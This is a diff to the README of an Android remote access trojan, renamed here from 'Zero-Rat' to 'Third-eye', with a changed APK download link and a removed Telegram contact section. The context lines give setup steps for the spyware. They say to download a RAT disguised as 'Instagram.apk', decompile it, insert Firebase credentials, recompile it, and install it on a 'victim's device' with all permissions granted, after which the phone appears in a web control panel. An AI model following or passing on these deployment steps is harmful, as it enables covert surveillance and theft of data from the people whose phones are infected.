@@ -1,7 +1,7 @@
 <p align="center">
 <img src='img/cn.png' style="height:100px;width:100px;" >
 </p>
-<h1 align=center>Zero-Rat</h1>
+<h1 align=center>Third-eye</h1>
 
 #### A multifunctional Android RAT with GUI based Web Panel without port forwarding.
 A tool that remasterd for AIRAVAT tool 
@@ -70,7 +70,7 @@ A tool that remasterd for AIRAVAT tool
  1. Open [home.html](./home.html) File and from [line number 16](https://github.com/Th30neAnd0nly/AIRAVAT/blob/302dca641bb04c6bed72d1b2cebdfc79ccfbb046/WEB%20PANEL/index.html#L16) replace the config with your web app config which you have created on Step 6.
  1. Save the file , Your Panel Setup is completed.
  ### Android RAT
- 1. Download [Instagram.apk](https://github.com/caronero/Zero-Rat/raw/master/APK/Instagram.apk)
+ 1. Download [Instagram.apk](https://github.com/mohdadil1/Third-eye/raw/master/APK/Instagram.apk)
  1. Decompile it using any Decompiler recommend above.
  1. Now open `res/values/strings.xml` file.
  1. Replace values of `firebase_database_url ` , `google_api_key` , `google_app_id` , `google_storage_bucket` , `project_id` with your Firebase Account using `google-services.json` file which you have downloaded on step 5
@@ -85,10 +85,6 @@ A tool that remasterd for AIRAVAT tool
  1. Now compile the code with appt2.
  1. Install the app in victim's device and give all the permissions after that the connection will show up in web panel.
 
-
-## Contact Info 
- 1. [Telegram](https://t.me/cn_zd)
- 2. [Watch full video installation here](https://t.me/cn_zd46/13)
 
 
 ## DISCLAIMER
